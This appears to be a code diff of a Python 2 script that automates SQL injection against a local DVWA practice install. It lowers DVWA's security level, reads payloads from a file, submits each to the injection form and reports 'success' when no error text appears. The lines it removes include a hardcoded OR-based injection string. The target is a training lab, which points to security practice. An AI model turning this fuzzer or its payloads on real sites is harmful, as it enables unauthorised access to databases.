@@ -11,6 +11,7 @@
 
 import mechanize
 from bs4 import BeautifulSoup
+import re
 
 cookies = mechanize.CookieJar()
 br1 = mechanize.Browser()
@@ -61,25 +62,36 @@ br1.select_form(nr=0)
 #br1.select_form(nr=0)
 br1.form.find_control(name="security", kind="list").value = ['low']
 br1.submit()
-print br1.response().read()
+#print br1.response().read()
 
 br1.open('http://127.0.0.1/DVWA-1.0.8/vulnerabilities/sqli/')
 print (br1.title())
-for form in br1.forms():
-    print form
-br1.select_form(nr=0)
-br1.form['id'] = r"a' OR ''='"
-br1.submit()
+#for form in br1.forms():
+#    print form
 
-#print br1.response().read()
+f = open("sqli.txt", 'r')
+for line in f.readlines():
+    br1.select_form(nr=0)
+    print "performing sql injection for %s", line
+    br1.form['id'] = str(line)
+    br1.submit()
+    p = re.compile('error')
+    if p.findall(br1.response().read()):
+        print "----------------FAILED-------------------"
+        br1.open('http://127.0.0.1/DVWA-1.0.8/vulnerabilities/sqli/')
 
-html = br1.response().read()
-bs = BeautifulSoup(html)
+    else:
+        print "SQL injection succeeded for %s", line
+        print "---------------------SUCCESS---------------"
 
-IDs = bs.find_all('div', {'class' : 'vulnerable_code_area'})
 
-for ID in IDs[0].find_all('pre'):
-   print ID
+#html = br1.response().read()
+#bs = BeautifulSoup(html)
+
+#IDs = bs.find_all('div', {'class' : 'vulnerable_code_area'})
+
+#for ID in IDs[0].find_all('pre'):
+#   print ID
 
 
 
@@ -88,5 +100,3 @@ for ID in IDs[0].find_all('pre'):
 #br2.set_cookiejar(cookies)
 #br2.open('http://127.0.0.1/DVWA-1.0.8/vulnerabilities/sqli/')
 #print(br2.title())
-
-
